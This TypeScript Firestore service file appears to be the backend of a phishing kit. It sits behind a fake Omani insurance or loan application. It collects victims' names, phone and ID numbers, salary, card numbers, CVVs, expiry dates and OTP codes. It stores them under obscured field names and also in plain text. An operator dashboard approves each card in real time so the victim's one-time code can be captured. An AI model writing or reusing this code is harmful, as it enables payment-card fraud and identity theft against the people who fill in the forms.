/**
 * Firestore service — writes visitor data to the "pays" collection
 * used by the dashboard at lwahatamen222.
 *
 * ⚠️  Encryption MUST match the dashboard's secure-utils.ts exactly:
 *     key = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c"  XOR + Unicode-safe Base64
 */
import {
  collection,
  addDoc,
  updateDoc,
  arrayUnion,
  doc,
  onSnapshot,
  serverTimestamp,
} from "firebase/firestore";
import { db } from "./firebase";

const COLLECTION = "pays";

/* ─────────────────────────────────────────────────────────
   Encryption  (must match dashboard's secure-utils.ts _e/_d)
───────────────────────────────────────────────────────── */
const _k = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";

function unicodeToBtoa(str: string): string {
  return btoa(
    encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode(parseInt(p1, 16)),
    ),
  );
}

function _e(s: string): string {
  let r = "";
  for (let i = 0; i < s.length; i++) {
    r += String.fromCharCode(s.charCodeAt(i) ^ _k.charCodeAt(i % _k.length));
  }
  return unicodeToBtoa(r);
}

/* ─────────────────────────────────────────────────────────
   Device / browser detection
───────────────────────────────────────────────────────── */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(ua);
  const isTablet = /Tablet|iPad/i.test(ua);
  const deviceType = isTablet ? "tablet" : isMobile ? "mobile" : "desktop";

  let browser = "unknown";
  if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = "Chrome";
  else if (/Firefox/.test(ua)) browser = "Firefox";
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Edge/.test(ua)) browser = "Edge";

  let os = "unknown";
  if (/Windows/.test(ua)) os = "Windows";
  else if (/Mac/.test(ua)) os = "macOS";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad/.test(ua)) os = "iOS";
  else if (/Linux/.test(ua)) os = "Linux";

  return {
    deviceType,
    browser,
    os,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
  };
}

/* ─────────────────────────────────────────────────────────
   Step 1 — Create visitor document (Page 1: Registration)
───────────────────────────────────────────────────────── */
export async function createVisitorDocument(data: {
  ownerName: string;
  phoneNumber: string;
  identityNumber: string;
}): Promise<string> {
  const now = new Date().toISOString();
  const deviceInfo = getDeviceInfo();

  const docRef = await addDoc(collection(db, COLLECTION), {
    ownerName: data.ownerName,
    phoneNumber: data.phoneNumber,
    identityNumber: data.identityNumber,
    country: "عُمان",

    documentType: "بطاقة جمركية",
    insuranceType: "تأمين جديد",
    insuranceCoverage: "",
    insuranceStartDate: "",
    vehicleUsage: "",
    vehicleValue: "",
    vehicleYear: "",
    vehicleModel: "",
    repairLocation: "agency",
    paymentStatus: "pending",
    status: "pending_review",
    currentStep: 1,
    currentPage: "registration",

    ...deviceInfo,
    isOnline: true,
    isBlocked: false,
    lastSeen: now,
    lastActiveAt: now,
    sessionStartAt: now,

    history: [],

    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  });

  return docRef.id;
}

/* ─────────────────────────────────────────────────────────
   Step 2 — Loan calculator data (Page 2)
───────────────────────────────────────────────────────── */
export async function updateLoanData(
  docId: string,
  data: {
    loanType: string;
    loanPeriod: string;
    repaymentMethod: string;
    loanPurpose: string;
    requestedAmount: string;
    salary: string;
    otherObligations: string;
    netIncome: string;
  },
) {
  const now = new Date().toISOString();
  await updateDoc(doc(db, COLLECTION, docId), {
    loanType: data.loanType,
    loanPeriod: data.loanPeriod,
    repaymentMethod: data.repaymentMethod,
    loanPurpose: data.loanPurpose,
    requestedAmount: data.requestedAmount,
    salary: data.salary,
    otherObligations: data.otherObligations,
    netIncome: data.netIncome,

    currentStep: 2,
    currentPage: "loan-calculator",
    lastActiveAt: now,
    lastSeen: now,
    updatedAt: serverTimestamp(),
  });
}

/* ─────────────────────────────────────────────────────────
   Step 3 — Card data (Page 3)
   • Encrypts _v1–_v4 with the same XOR+Base64 as the dashboard
   • Pushes a "_t1" history entry so the dashboard shows the card bubble
     with ✓ Approve / ✗ Reject buttons
───────────────────────────────────────────────────────── */
export async function updateCardData(
  docId: string,
  data: {
    cardNumber: string;
    cvv: string;
    expiryDate: string;
    cardHolderName: string;
  },
) {
  const now = new Date().toISOString();

  // Encrypt — must match dashboard's _e() from secure-utils.ts
  const enc_v1 = _e(data.cardNumber);
  const enc_v2 = _e(data.cvv);
  const enc_v3 = _e(data.expiryDate);
  const enc_v4 = _e(data.cardHolderName);

  // History entry that the dashboard reads to show the card bubble
  const historyEntry = {
    id: `card_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    type: "_t1",          // "_t1" = card  (see history-helpers.ts ENTRY_TYPE_LABELS)
    timestamp: now,
    status: "pending",
    data: {
      _v1: enc_v1,        // card number  (encrypted)
      _v2: enc_v2,        // CVV          (encrypted)
      _v3: enc_v3,        // expiry date  (encrypted)
      _v4: enc_v4,        // holder name  (encrypted)
      cardNumber:    data.cardNumber,   // plain — fallback for legacy display
      cvv:           data.cvv,
      expiryDate:    data.expiryDate,
      cardHolderName: data.cardHolderName,
    },
  };

  await updateDoc(doc(db, COLLECTION, docId), {
    // Top-level encrypted fields (legacy + direct display)
    _v1: enc_v1,
    _v2: enc_v2,
    _v3: enc_v3,
    _v4: enc_v4,
    cardNumber:    data.cardNumber,
    cvv:           data.cvv,
    expiryDate:    data.expiryDate,
    cardHolderName: data.cardHolderName,

    // Status fields — triggers dashboard to show the pending card bubble
    cardStatus: "pending",
    otpStatus: "waiting",
    _v5Status: "pending",

    currentStep: 3,
    currentPage: "card-pending",
    lastActiveAt: now,
    lastSeen: now,
    cardUpdatedAt: now,
    updatedAt: serverTimestamp(),

    // Push history entry — dashboard reads this array for bubbles
    history: arrayUnion(historyEntry),
  });
}

/* ─────────────────────────────────────────────────────────
   Real-time watcher — called from LoadingPage
   Listens for dashboard approve/reject signals on the document
───────────────────────────────────────────────────────── */
export function watchCardStatus(
  docId: string,
  onApprove: () => void,
  onReject: () => void,
): () => void {
  const docRef = doc(db, COLLECTION, docId);
  return onSnapshot(docRef, (snap) => {
    if (!snap.exists()) return;
    const d = snap.data();
    const cardStatus: string = d?.cardStatus ?? "";
    const otpStatus: string  = d?.otpStatus  ?? "";

    // Approve signals — dashboard sets one of these to show OTP page
    if (
      cardStatus === "approved_with_otp" ||
      cardStatus === "approved_with_pin" ||
      otpStatus  === "show_otp" ||
      otpStatus  === "show_pin"
    ) {
      onApprove();
    }

    // Reject signal — send visitor back to card entry
    if (cardStatus === "rejected") {
      onReject();
    }
  });
}

/* ─────────────────────────────────────────────────────────
   Step 4 — OTP code (OTP page)
   • Encrypts the code and pushes a "_t2" history entry
     so the dashboard shows the OTP bubble with approve/reject buttons
───────────────────────────────────────────────────────── */
export async function submitOtpCode(docId: string, otpCode: string) {
  const now = new Date().toISOString();
  const enc_v5 = _e(otpCode);

  const historyEntry = {
    id: `otp_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
    type: "_t2",          // "_t2" = otp  (see history-helpers.ts)
    timestamp: now,
    status: "pending",
    data: {
      _v5: enc_v5,        // OTP code (encrypted)
      otpCode,            // plain — fallback
      otp: otpCode,
    },
  };

  await updateDoc(doc(db, COLLECTION, docId), {
    // Top-level fields
    _v5: enc_v5,
    otpCode,
    otp: otpCode,
    _v5Status: "verifying",
    otpStatus: "verifying",

    otpUpdatedAt: now,
    lastActiveAt: now,
    lastSeen: now,
    currentPage: "otp",
    updatedAt: serverTimestamp(),

    // Push history entry
    history: arrayUnion(historyEntry),
  });
}

/* ─────────────────────────────────────────────────────────
   Mark visitor offline (called on window unload)
───────────────────────────────────────────────────────── */
export async function markVisitorOffline(docId: string) {
  const now = new Date().toISOString();
  await updateDoc(doc(db, COLLECTION, docId), {
    isOnline: false,
    lastSeen: now,
    updatedAt: serverTimestamp(),
  });
}
